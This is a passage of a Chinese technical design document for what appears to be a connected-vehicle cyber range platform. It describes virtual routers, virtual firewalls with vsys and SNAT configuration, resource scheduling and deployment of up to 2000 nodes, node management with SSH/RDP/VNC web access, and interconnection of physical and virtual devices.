data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/60775a8c7b0910b873cf0a9eb3d80c0b.png"></p><p>编写Web服务</p><p>该服务可远程查询路由器路由表，接口网络命名空间使用<a href="http://ip:4501/route">http://ip:4501/route</a></p><p>4.设置部署代码开机自动执行</p><p>配置/etc/rc.local文件</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/4c5f6b8cd6b04f850776059762fd6f08.png"></p><p>local文件</p><p>该文件所做工作为：开机启动时启动zebra,ospf服务，并执行配置程序，最后启动一个web服务，用于远程查询该路由器的路由表。</p><p>5.至此，虚拟路由器开发完成，需要将该实例打包成新的路由器镜像。打包镜像的文档在附件里。打包后镜像，可上传到任一openstack使用。</p><p>轻量级虚拟化路由器：基于Docker原生操作系统级镜像，借助OSPF协议与BGP协议的路由原则，利用路由软件技术，设计开发实现轻量级虚拟化路由器软件，并利用Dockerfile将该软件制作为轻量级虚拟化路由器软件镜像。其可实现OSPF协议、BGP协议的动态路由协议仿真，配置命令与真实路由器相似。</p><h6 id="虚拟路由器拥塞控制、优先级设置"><a href="#虚拟路由器拥塞控制、优先级设置" class="headerlink" title="虚拟路由器拥塞控制、优先级设置"></a>虚拟路由器拥塞控制、优先级设置</h6><p>全虚拟化技术在操作系统和底层硬件之间使用一个软件中间层来管理底层硬件资源，当客户操作系统执行某项指令时，软件中间层将接管该段代码，并执行对应的操作，这就使得操作系统可以拥有独立的内核，在逼真性上相较于其他虚拟化技术有巨大优势。全虚拟化技术的代表有VMware和KVM，由于OpenStack对KVM技术具有良好的亲和性，并且其能够仿真出逼真度极高的虚拟节点，所以采用KVM技术来实现路由仿真的虚拟化平面。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/bcc3b7d256b0fae331af8261231bab84.emf"></p><p>软件中间层管理底层硬件资源</p><p>全虚拟化技术在操作系统和底层硬件之间使用一个软件中间层来管理底层硬件资源，当客户操作系统执行某项指令时，软件中间层将接管该段代码，并执行对应的操作，这就使得操作系统可以拥有独立的内核，在逼真性上相较于其他虚拟化技术有巨大优势。全虚拟化技术的代表有VMware和KVM，由于OpenStack对KVM技术具有良好的亲和性，并且其能够仿真出逼真度极高的虚拟节点，所以采用KVM技术来实现路由仿真的虚拟化平面。</p><p>在路由仿真的控制平面上采用可扩展的模块化软件路由器来实现路由仿真中对多种路由协议的支持。软件路由器分为三个部分，分别为路由表、路由表控制器和路由协议模块。路由表为操作系统内核中的routing table，所有报文依据路由表中的路由条目进行转发，是路由器的实现基础。路由表控制器将路由协议模块计算出的路由表项写入内核路由表中，是连接路由表和路由协议模块的纽带。路由协议模块实现对具体路由协议的支持，如RIP、OSPF、BGP等，并负责路由发现、路由计算等功能，是实现路由控制的关键。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/21748e0bb578b4552b63662522d27fde.emf"></p><p>拥塞控制模块</p><p>拥塞控制模块包括队列管理模块、缓冲队列模块和延迟模块。队列管理模块负责处理数据链路层交付下来的报文，决定报文是进入缓冲队列模块还是被丢弃，为了保证虚拟路由器在拥塞控制上的逼真性，采用实物路由器中常见的弃尾（Droptail）算法作为报文队列管理算法。缓冲队列模块实现了一个FIFO报文队列，队列长度可自由定义，待出队的报文在其中进行出队前的排队操作。延迟模块负责对出队列的报文进行延迟操作，仿真出报文在队列中的排队延迟。</p><p>延迟模块设计如下:</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/80e3048e8cab0e64176e0b02b3d894c2.emf"></p><p>延时模块</p><p>报文从缓冲队列模块到达延迟模块中的报文暂存模块后，延迟模块的计时器从控制器中获取延迟时间。延迟模块中的计时器进入计时状态，根据延迟时间开始计时。当时间达到设定的延迟时间后，报文从延迟模块中离开交付为物理层。</p><h5 id="虚拟防火墙"><a href="#虚拟防火墙" class="headerlink" title="虚拟防火墙"></a>虚拟防火墙</h5><p>虚拟防火墙在虚拟化环境中承担着与实物防火墙类似的功能，并提供了基本的配置选项来定义防火墙的规则策略。配置防火墙规则时，可以包括目的地址IP、源IP、目的端口、源端口、协议类型以及动作（拒绝/允许）等参数。通过这些参数的配置，可以对进出虚拟防火墙的流量进行控制和过滤，确保网络安全的同时实现流量的合法传输。1、配置不同vsys中的相关安全策略，安全策略各自独立，互不影响。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/4fb86ba4690e9cb9c11242b6ac09d3db.jpeg" alt="安全策略各自独立"></p><p>安全策略各自独立</p><p>2、配置不同vsys的管理员账户，管理员登陆后可单独管理私有的防火墙配置。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/a72beced69cee4bef4754de15b66be4e.jpeg" alt="防火墙配置"></p><p>防火墙配置</p><p>3、 应用配置生效</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f200892e100db80482710705702a00f1.jpeg" alt="应用配置生效"></p><p>应用配置生效</p><h5 id="虚拟服务器-客户端-车载零部件"><a href="#虚拟服务器-客户端-车载零部件" class="headerlink" title="虚拟服务器/客户端/车载零部件"></a>虚拟服务器/客户端/车载零部件</h5><p>在虚拟化环境中，可以进行虚拟服务器、客户端主机和车载零部件的仿真配置，其中包括KVM虚拟机、基于容器的Docker主机及车机、tbox、网关。支持目前主流的window操作系统和linux操作系统。客户可通过web界面登录。每个虚拟防火墙系统都可以被看成是一台完全独立的防火墙设备，可拥有独立的系统资源、管理员、安全策略、用户认证数据库等。</p><p>支持绘制仿真虚拟主机，配置的参数包括虚拟主机的基础信息，名称、图标类型（系统默认、自定义）、所属势力方、自定义描述内容、自定义属性；配置属性，包括镜像、配额、可用域等信息。</p><p>系统提供了根据镜像名称、操作系统类型（Linux、Windows、Macos、Unix）、镜像权限(私有、共享、公共）、虚拟化类型（KVM、Docker、WMware）、设备类型等多种条件进行过滤。并根据选择的镜像的磁盘配额信息自动过滤出符合要求的配额模板列表。支持根据所选镜像自动过滤出符合要求的可用域。如docker部署在docker域。配置端口信息系统提供了自动生成（自动避免IP冲突）和手动配置两种方式。</p><p>虚拟系统的特点：</p><p>每个虚拟系统由独立的管理员进行管理，使得多个虚拟系统的管理更加清晰简单，所以非常适合大规模的组网环境。</p><p>每个虚拟系统拥有独立的配置及路由表项，这使得虚拟系统下的局域网即使使用了相同的地址范围，仍然可以正常进行通信。</p><p>可以为每个虚拟系统分配固定的系统资源，保证不会因为一个虚拟系统的业务繁忙而影响其他虚拟系统。</p><p>虚拟系统之间的流量相互隔离，更加安全。在需要的时候，虚拟系统之间也可以进行安全互访。</p><p>虚拟系统实现了硬件资源的有效利用，节约了空间、能耗以及管理成本。</p><p>具体配置如下：</p><p>1、 创建vsys、vrouter并做两者之间的关联</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/6d69c35dbd5f2d1361225441e109fef3.jpeg" alt="vrouter"></p><p>vrouter</p><p>2、 配置三层接口，路属于不同的vsys并绑定在vrouter上</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c49e4bdfb5d1ed48c8b79dd1056767c0.jpeg" alt="三层接口"></p><p>三层接口</p><p>Vrouter和接口都属于虚拟系统的资源，可被分配到不同虚拟系统上，vrouter可以被多个虚拟系统共享也可单独占有，接口只能被唯一一个虚拟系统占有。</p><p>Vrouter和vswitch不单单属于虚拟系统的资源和被占用，它们也是网络的一种部署，代表了虚拟系统中的二层或三层的网络转发。</p><p>3、 配置不同vsys上外网的路由条目</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/0aa2758491496e0003405097c23eb89d.jpeg" alt="vsys"></p><p>vsys</p><p>4、 配置不同vsys中的SNAT的策略，策略独立</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/7418bcea77a058ca28720763a3d685d1.jpeg" alt="SNAT"></p><p>SNAT</p><h3 id="目标网络调度模块"><a href="#目标网络调度模块" class="headerlink" title="目标网络调度模块"></a>目标网络调度模块</h3><h4 id="功能实施方案-1"><a href="#功能实施方案-1" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>1）系统具备虚拟节点资源的调度功能，可实现灵活地管理和调度虚拟节点资源，包括覆盖虚拟节点计算资源和存储资源的调度，当在一个的场景中，有较大的资源需求，而在另一个场景中还有大量的资源富余时，可通过此调度功能对计算资源和存储资源进行调度，以满足需求量大的节点对资源的使用请求。该功能基于高效的资源管理和调度算法，确保虚拟节点的资源可以根据实际需求进行灵活的分配和调整，以最大化资源利用率和提升虚拟节点的性能。</p><p>2）系统支持虚拟网络资源的调度功能，包括了IP地址、端口号、链路等各种网络资源的调度，可以实现高效的网络资源管理和利用，通过该调度模块，能够根据需求智能地分配和管理虚拟网络资源，确保网络资源的合理利用和优化配置。无论是针对特定的攻击场景模拟还是网络拓扑调整，该调度模块都能根据预设的参数进行灵活的资源调度，而不改变参数的原本意义。虚拟网络资源调度功能为智能网联汽车靶场提供高效、灵活的网络资源管理手段，提高网络资源利用率。</p><p>3）系统能够进行实物设备资源的调度，包括实物网络设备、安全设备、计算设备等，实现高效的实物设备资源管理和利用。通过该调度模块，用户能够根据需求智能地分配和管理实物设备资源，确保设备资源的合理利用和优化配置。无论是进行实际的车联网测试、安全演练还是系统性能评估，该调度模块都能根据预设的参数进行灵活的资源调度，而不改变参数的原本意义。实物设备资源调度功能为智能网联汽车靶场提供更高效、灵活的设备资源管理手段。</p><p>4）系统提供试验场景所需各类资源的计算调度，同时对底层资源的充足性进行计算分析，对于资源不足的情况，系统将提供明确的提示，能够根据试验场景所需的各类资源，进行计算调度，以确保底层资源的充足性。系统能够智能地评估底层资源的可用性，并根据需求对不满足资源要求的情况进行提示。无论是针对网络性能测试、安全演练还是其他试验场景，该调度模块都能根据预设的参数对资源进行计算，并及时提醒用户底层资源的充足性。资源计算调度功能为智能网联汽车靶场提供更高效、可靠的资源管理手段，确保用户在测试过程中能够充分利用满足要求的资源，并及时了解不足的资源情况。</p><p>5）目标网络部署功能是一个非常强大且灵活的平台，它可以根据用户配置的目标网络信息进行部署，支持对各种虚拟机、容器和实物设备进行统一的部署。无论是基于X86架构还是ARM架构的虚拟机，或者是容器化的应用程序，甚至是实际的物理设备，都可以通过该平台进行部署和管理。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/65e05a2a15b138857c46097a85322926.png"></p><p>X86虚拟节点、ARM虚拟节点、容器节点、实物节点</p><p>该功能的主要特点之一是能够构建虚实结合的目标网络。在实际的汽车通信环境中，不同的链路质量对通信性能有着重要影响。因此，目标网络部署功能支持设置链路带宽、延迟和丢包率等详细链路特性，以模拟不同链路质量的汽车通信链路情况。这包括了车与云端的通信、车辆之间的V2X通信以及车载以太网等多种场景，可以根据实际需求进行配置和模拟，以便更好地评估和测试系统的性能和稳定性。</p><p>除了能够进行整体的目标网络部署外，该平台还支持增量部署。增量部署可以对已经部署好的目标网络环境进行删除、更新和增加操作，而不会影响到其他节点的正常运行。这为用户提供了更大的灵活性，可以根据实际需求对目标网络进行动态调整和优化，而无需重新部署整个网络。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/39195220428a13b3790e14a49d8eab28.png" alt="1705438415858"></p><p>在部署过程中，该功能还提供了监控和展示的功能。可以实时监控部署的进度和状态，包括各类节点的总数、进度以及错误类型。通过界面展示，可以清晰地了解部署的情况，同时也能够快速定位和解决可能出现的问题。具体的展示内容包括进行中、等待中、失败和成功的具体节点和数量等信息，对于部署失败的节点，系统会给出相应的失败原因，帮助用户快速排查和修复。</p><p>总之，目标网络部署功能是一个强大而灵活的平台，它可以根据用户的需要进行各种设备的统一部署，并支持链路特性的配置和模拟。通过增量部署和监控展示的功能，用户能够更好地管理和优化目标网络，提高系统的性能和稳定性。该功能的应用范围广泛，不仅适用于汽车通信领域，也可应用于其他需要对目标网络进行部署和管理的领域。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/daa1cf5b6085d83581a28c0fbec32dae.png"></p><h4 id="性能实施方案-1"><a href="#性能实施方案-1" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><p>1）本系统支持2000节点的同时部署调度能力。通过采用高效的资源管理和调度算法，系统能够保证在大规模部署需求下维持良好的性能和稳定性，确保，在复杂多变的网络环境下，系统能够高效、稳定地运行。</p><p>2）系统支持单一拓扑增量部署次数20次，并能记录各次的部署记录。通过部署记录和管理功能，系统能够有效地追踪和优化部署过程。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/daa1cf5b6085d83581a28c0fbec32dae.png"></p><h4 id="技术实现内容-1"><a href="#技术实现内容-1" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>功能参数设计为具备全面的资源调度能力。这包括对虚拟节点计算资源和存储资源的有效调度，以及虚拟网络资源（如IP地址、端口、链路）的灵活配置。此外，系统还具备对实物设备资源（包括实物网络设备、安全设备和计算设备）的调度功能，确保资源得到最优化利用。同时，系统提供了针对试验场景所需各类资源的计算调度功能，能够自动检测底层资源的充足程度，并对不满足的资源进行提示。此外，系统还具备根据配置的目标网络信息进行部署的能力，支持对X86架构虚拟机、ARM架构虚拟机、容器以及实物设备的统一部署。它能够构建虚实结合的目标网络，并支持设置详细的链路特性，如链路带宽、延迟和丢包率，用于模拟不同的汽车通信链路情况。系统还支持在已部署的网络环境中进行增量部署，包括设备的删除、更新和增加操作，同时确保这些操作不会影响其他节点。系统还提供了对部署过程的监控和展示功能，能够展示各类节点的总数、进度、以及部署错误的类型，并对部署失败的节点给出具体的失败原因。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/39195220428a13b3790e14a49d8eab28.png" alt="1705438415858"></p><p>性能参数设计为支持高效的节点部署和调度。系统能够支持最多2000个节点的同时部署调度，确保在大规模的测试环境中保持高效运行。此外，系统还支持单一拓扑的增量部署次数达到20次，能够记录每次部署的详细信息，包括各次部署的配置、变更和结果，从而为用户提供丰富的操作记录和数据分析基础。</p><p>1. 部署配置视图：</p><p>功能参数如下：提供一个配置界面，允许用户根据目标网络信息进行配置。可以指定目标网络的拓扑结构、节点类型和数量等信息。</p><p>功能参数如下：支持选择不同架构的虚拟机（X86架构和ARM架构）、容器和实物设备进行部署。可以根据实际需求选择适合的部署方式。</p><p>功能参数如下：具备设置链路带宽、延迟和丢包率等详细链路特性的功能。可以根据需要模拟不同链路质量的汽车通信链路情况，如车云通信、V2X和车载以太网等。</p><p>2. 增量部署视图：</p><p>功能参数如下：提供增量部署功能，允许用户对已部署的目标网络环境进行删除、更新和增加操作，而不影响其他节点的正常运行。</p><p>功能参数如下：支持对设备进行删除、更新和增加操作的界面，可以选择要操作的设备，并执行相应的操作。系统会自动处理设备之间的依赖关系。</p><p>3. 部署监控和展示视图：</p><p>功能参数如下：提供一个监控和展示界面，用于实时监控部署过程和展示相关信息。</p><p>功能参数如下：显示部署的各类节点总数和进度，可以清晰地了解整个部署过程的进展情况。</p><p>功能参数如下：展示部署错误的类型和失败节点的详细信息，系统会给出失败原因和相应的错误提示，便于用户进行故障排查和修复。</p><p>通过以上视图方式，可以方便地配置目标网络信息、进行增量部署操作，并实时监控和展示部署过程的状态和结果。这样的系统设计可以提高部署的灵活性和效率，同时减少对其他节点的影响，从而更好地满足XXXX的需求。</p><p>设计和实现一个资源调度和部署系统，用于管理和分配虚拟节点资源、虚拟网络资源、实物设备资源，并能够在试验场景中进行有效的资源计算调度，同时支持目标网络的部署和增量更新。</p><p>方案概述</p><p>（一）资源调度系统设计</p><p>虚拟资源调度：实现一个虚拟资源管理器，负责虚拟节点的计算资源和存储资源的调度。</p><p>虚拟网络资源调度：设计虚拟网络资源管理器，负责IP地址管理、端口分配和虚拟链路的建立与维护。</p><p>实物资源调度：构建实物资源管理器，用于管理实体网络设备、安全设备和计算设备的资源分配。</p><p>（二）资源充足性计算</p><p>资源需求计算：开发资源需求评估模块，用以评估试验场景所需资源，并计算底层资源充足性。</p><p>资源不足提示：当资源不满足要求时，系统应提供明确的提示信息。</p><p>（三）目标网络部署</p><p>部署引擎设计：开发一个部署引擎，支持根据配置目标网络信息进行虚拟机、容器和实物设备的统一部署。</p><p>链路特性设置：在部署模块中，允许用户设置链路带宽、延迟、丢包率等，以模拟不同的通信链路质量。</p><p>增量部署与更新：实现增量部署功能，支持设备的删除、更新和增加操作，且不影响其他节点的运行。</p><p>部署监控与展示：设立一个监控中心，用于实时监控部署过程，并展示部署进度和状态。</p><p>（四）性能参数满足</p><p>大规模部署能力：确保系统支持不低于2000个节点的同时部署调度。</p><p>增量部署记录：系统应能够记录单一拓扑的增量部署次数（不低于20次）和详细的部署记录。</p><p>（五）需求分析与规划</p><p>分析试验场景的资源需求。</p><p>规划资源管理架构。</p><p>系统开发：</p><p>开发虚拟资源管理器、虚拟网络资源管理器和实物资源管理器。</p><p>实现资源充足性计算模块。</p><p>编写部署引擎和增量更新逻辑。</p><p>设计部署监控界面。</p><p>（六）测试与优化</p><p>进行单元测试、集成测试和性能测试。</p><p>根据测试结果优化系统性能。</p><p>（七）部署与监控</p><p>在实际环境中部署系统。</p><p>监控系统运行情况，确保性能参数满足要求。</p><p>编程语言：使用高性能的编程语言如Go或Rust，提高并发处理能力。</p><p>数据库：采用高可用性和可扩展性的数据库系统，如PostgreSQL或MongoDB。</p><p>虚拟化技术：使用KVM、Docker等成熟的虚拟化技术。</p><p>网络虚拟化：使用Open vSwitch等工具进行网络资源的虚拟化和调度。</p><p>监控工具：集成Prometheus、Grafana等监控工具进行系统监控。</p><p>自动化部署：使用Ansible、Terraform等自动化部署工具。</p><p>（八）预期结果</p><p>成功实现一个高效、可靠的资源调度和部署系统。</p><p>满足高并发部署的性能要求，确保系统稳定运行。</p><p>实现对复杂网络环境的快速部署和灵活调整。</p><h3 id="目标网络管理模块"><a href="#目标网络管理模块" class="headerlink" title="目标网络管理模块"></a>目标网络管理模块</h3><h4 id="功能实施方案-2"><a href="#功能实施方案-2" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>部署完成的目标网络管理控制功能覆盖虚拟节点的全生命周期操作，包括启动、停止、重启、设置密码、重建及端口转发等。提供的系统支持虚拟节点的启动、停止、重启等基础操作。通过该管理模块，可以对目标网络中的虚拟节点进行灵活的操作和配置，以满足不同测试需求。支持快速启动、停止或重启虚拟节点，根据需要设置密码以增强安全性，进行虚拟节点的重建以恢复到初始状态，以及进行端口转发以实现网络流量的定向引导。可满足智能网联汽车靶场的目标网络管理对系统的整体管理，可以根据实际需求对虚拟节点进行操作。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/44bb3b89964ba1c389cfe7fcb673d84a.png" alt="企业微信截图_17053273072640"></p><p>2）通过虚拟节点的迁移功能与运行状态监控功能，实现了节点的动态管理和实时监视。监控模块通过实时数据采集与分析技术，全面覆盖节点的启停状态和资源利用情况。系统采用智能化的资源调配策略和优化算法，确保资源按需分配，提高节点的稳定性和整体资源利用效率。</p><p>3）网络场景锁定功能特别针对试验和演练场景设计，自动锁定网络配置和参数，避免未经授权的更改，防止其他人在试验开始后修改场景内拓扑结构和参数。基于角色访问控制和配置审计，保障试验环境的一致性和可靠性。竞赛、演练开始后支持自动锁定场景，满足竞赛或演练业务需要。</p><p>4）提供的系统具备对于部署后网络拓扑进行动态校验的功能，支持对网络的IP地址和端口联通性进行检验。系统集成了网络测试和诊断工具，能够对网络结构和连接进行持续的实时验证，支持根据场景自动检验和人工配置校验等，能够自动判定场景网络配置的正确性，也支持人工开展网络组网校验，确保网络布局的正确性和运行的有效性。</p><p>5）提供的目标网络管理系统不仅具备强大的虚拟化能力，还特别关注用户体验的便捷性和高效性。因此，特别提供了虚拟化节点、容器节点和实物节点的无差异Web接入操作功能。通过这一功能，可以轻松地通过Web浏览器实现对虚拟化节点、容器节点和实物节点的远程操作和管理。无论是在本地还是远程，用户都能够随时随地访问靶场网络，进行相关测试或演练。这种无差异的Web接入操作方式为用户提供了极大的便利性，使他们能够更加专注于测试或演练任务本身。在接入方式上，的系统支持SSH、RDP和VNC等3种的远程协议类型。这些协议类型都是在行业内广泛使用并被证明高效可靠的远程连接协议，能够满足用户对不同设备和场景的需求。无论是Linux系统还是Windows系统，无论是命令行界面还是图形化界面，用户都能够通过相应的协议进行快速、稳定的远程连接。除了基本的远程接入功能外，系统还支持文件上传和下载操作。可以将必要的文件或数据直接上传到靶场网络中，或者从靶场网络下载所需的数据或结果。这种文件传输功能大大提高了用户的工作效率，使他们能够更加便捷地进行数据交换和管理。为了更好地满足用户对测试或演练过程的记录和分析需求，系统还支持对操作的过程进行录屏。可以随时开启录屏功能，将整个操作过程录制下来，以供后续的回放和分析。这种录屏功能为用户提供了详细的操作记录，有助于他们更好地理解测试或演练的过程和结果。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/022f7e74a23ce11fb9e513a7c2854df9.png" alt="企业微信截图_17053272962733"></p><h4 id="性能实施方案-2"><a href="#性能实施方案-2" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><p>1）系统拥有处理不低于1400节点的管理能力，系统具备处理大规模网络管理任务的扩展性和稳定性。基于高效的资源管理和优化的网络通信协议，确保处理大量节点数量的情况下，系统仍能保持高效的响应速度和准确的节点控制。</p><p>2）系统支持不低于100个虚拟节点的批量管理能力，涵盖启动、关机、重启、修改密码和销毁等操作。批量修改密码功能提供随机和指定两种模式，增加了操作的安全性和灵活性。系统基于自动化脚本和批处理技术，实现快速、一致的节点管理。</p><p>3）提供的目标网络管理系统具备强大的并发处理能力，能够支持同时不低于200人接入操作，并具备扩展以实现更多人同时接入的能力。</p><p>系统采用先进的架构设计，能够高效地处理大量的并发请求。通过合理的资源分配和优化，确保了每个用户都能够获得流畅、稳定的操作体验。无论是进行简单的测试还是复杂的演练，用户都能够快速地完成任务，而无需担心系统性能的瓶颈。系统还采用了可扩展的设计理念。随着用户数量的增加，系统也能够进行相应的扩展，以支持更多人同时接入操作。这种可扩展性为用户提供了更大的灵活性，使他们可以根据实际需求调整系统规模，以满足不断增长的操作需求。为确保系统的稳定性和可靠性，进行了严格的测试和性能优化。通过模拟各种场景和压力测试，验证了系统在高并发情况下的表现。结果表明，系统能够轻松应对大规模的并发操作，保证用户操作的顺利进行。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/80d01887e46e42241d514649e62f72af.png" alt="1703491695987"></p><p>同时接入超过200人</p><h4 id="技术实现内容-2"><a href="#技术实现内容-2" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>功能参数设计方面，系统提供了全面的管理和控制功能，以确保目标网络的有效运营。具体功能包括虚拟节点的启动、停止、重启、设置密码、重建、端口转发等管理操作，可以根据需要对虚拟节点进行灵活的管理和配置。此外，系统还支持虚拟节点的迁移功能，并监控虚拟节点的运行状态，包括节点的启停状态和资源利用情况，这有助于用户根据实际需求进行虚拟节点的迁移操作，以确保系统的平稳运行。为了保障目标网络场景的稳定性，系统提供场景锁定功能，防止在试验开始后对场景内的拓扑结构和参数进行修改。同时，竞赛和演练开始后，系统还支持自动锁定场景，以确保操作的稳定性和一致性。系统还具备对部署后的网络拓扑进行动态校验的功能，包括校验IP和端口的联通性。可以选择自动检验或进行人工配置校验，以确保网络的正常运行。为了方便用户操作目标网络，系统提供了虚拟化节点、容器节点和实物节点的无差异Web接入操作。可以选择SSH、RDP和VNC等远程协议类型的接入方式，同时支持文件上传和下载操作，并记录操作过程以供回顾。</p><p>性能参数设计方面，系统支持管理和控制最多1400个节点，以满足大规模网络管理的需求。具备100虚拟节点的批量管理能力，包括批量启动、关机、重启、修改密码和销毁等操作。可以选择随机或指定模式进行批量修改密码，从而提高了管理的效率。系统能够同时支持200人的接入操作，并具备扩展性，以满足更多用户接入的需求。这确保了多用户同时管理和操作目标网络的顺畅性。这些性能参数的设计充分考虑了系统在大规模网络管理和操作中的高效性和可扩展性，以满足复杂网络环境下的需求。</p><p>设计一个全面的目标网络管理和控制系统，用于监控、管理和维护虚拟化节点、容器节点和实物节点。系统应提供节点迁移、网络场景锁定、动态校验等功能，并支持不同远程协议的Web接入操作。</p><p>（一）网络管理控制系统设计：</p><p>节点管理功能：实现节点管理模块，提供启动、停止、重启、设置密码、重建、端口转发等功能。</p><p>状态监控与迁移：设计节点监控模块，实时监控节点运行状态和资源利用情况，并提供迁移功能。</p><p>场景锁定机制：开发场景锁定功能，确保试验或演练开始后场景不被修改。</p><p>拓扑动态校验：实现拓扑校验工具，支持IP和端口连通性的自动和手动校验。</p><p>（二）Web接入操作</p><p>无差异接入：提供统一的Web接入平台，支持SSH、RDP、VNC等远程协议。</p><p>文件管理：允许用户通过Web接入平台上传和下载文件。</p><p>操作录屏：集成录屏功能，记录操作过程。</p><p>（三）需求分析与规划</p><p>分析网络管理和控制的需求。</p><p>规划系统架构和功能模块。</p><p>（五）系统开发</p><p>开发网络管理控制模块，实现节点的基本操作功能。</p><p>实现节点状态监控与迁移功能。</p><p>设计并实现场景锁定机制。</p><p>开发拓扑动态校验工具。</p><p>（六）Web接入平台</p><p>设计并实现无差异Web接入操作平台。</p><p>集成文件管理和操作录屏功能。</p><p>（七）测试与优化</p><p>进行单元测试、集成测试和性能测试。</p><p>根据测试结果优化系统性能。</p><p>（八）部署与监控</p><p>在实际环境中部署系统。</p><p>监控系统运行情况，确保性能参数满足要求。</p><p>（九）技术选型</p><p>前端框架：使用如React或Vue.js等现代前端框架。</p><p>后端框架：使用如Spring Boot或Django等高效的后端框架。</p><p>虚拟化技术：使用KVM、Docker等成熟的虚拟化技术。</p><p>网络管理：使用OpenStack、Kubernetes等云管理平台。</p><p>远程协议支持：集成Guacamole或其他远程桌面网关解决方案。</p><p>（十）预期结果</p><p>成功实现一个能够高效管理超过1400个节点的网络管理和控制系统。</p><p>实现对网络场景的稳定锁定和动态校验，确保试验和演练的准确性。</p><p>提供无差异的Web接入操作，满足多协议支持和多用户接入的需求。</p><h3 id="虚实互联管理模块"><a href="#虚实互联管理模块" class="headerlink" title="虚实互联管理模块"></a>虚实互联管理模块</h3><p>虚实互联管理模块将实物设备（实车、零部件、测试工具、物理主机、安全设备、网络设备等）或物理网络与靶场基础平台生成的虚拟网络互联，组成统一的汽车目标网络。实物设备通过虚拟互联交换机与靶场基础平台相连。</p><p>功能包含设备部署、设备管理、列表展示、设备增删改查；对部署成功的设备将展示在列表中，设备管理中对部署好的拓扑中的虚拟设备、实物设备和路由设备进行管理。如为已经部署的虚拟机安装软件或者上传文件，查看实物设备的名称、IP信息，为路由设备进行路由器设置，下发路由配置等操作。</p><h4 id="功能实施方案-3"><a href="#功能实施方案-3" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>1）系统支持多种设备接入，包括实车、车载零部件、测试工具、物理主机及各类安全和网络设备，如车载以太网、CAN、LIN等。通过与网络靶场平台的虚拟网络进行连接，可以形成虚实结合的目标网络，为用户提供更加真实和全面的测试或演练环境。这种集成能力使得能在实际设备和虚拟环境之间进行无缝切换，从而更好地模拟真实场景，提高测试或演练的准确性和可靠性。系统集成的网络接入和管理技术允许这些物理设备与网络靶场平台生成的虚拟网络相连，构建虚实结合的目标网络环境。系统处理过程中，物理和虚拟网络的结合通过高效的数据交换和协议匹配技术实现，满足复杂网络环境下的测试需求。</p><p>2）系统具备透明接入功能，支持IPS等有线透明设备无缝接入到虚拟网络。该功能允许透明设备与虚拟设备之间，或虚拟设备与实物设备之间的串联，同时系统满足维持透明设备的原有网络属性，如IP地址和MAC地址的不变性。可以将透明实物设备串联到虚拟设备之间或虚拟设备与实物设备之间，而不会改变透明设备的属性。这种功能为用户提供了更大的灵活性，使他们可以根据实际需求进行各种复杂的设备和网络配置。通过这种透明接入方式，可以更加真实地模拟实际网络环境，并更好地评估和测试实物设备在网络中的表现和性能。</p><p>3）系统支持IPS等有线透明设备的透明接入功能，使得透明实物设备能够与虚拟设备或其他实物设备之间进行有效的数据交换和通信。系统实现这一功能的同时，满足透明设备在网络中保持其固有的网络属性，确保网络安全和稳定性不受影响。</p><p>4）系统功能包括支持实物设备与虚拟网络中的虚拟机和容器在同一编址空间内操作。系统通过先进的网络编址技术和网络管理策略实现此功能，确保虚拟机和容器与物理设备在统一的网络地址空间内互联互通，同时维护网络的结构和安全性。</p><p>5）系统还支持异地设备接入到虚拟网络中，满足这些设备与虚拟网络中的虚拟机和容器在同一编址空间内操作。该功能通过远程网络接入技术和网络管理策略实现，确保远程设备安全且高效地接入到虚拟网络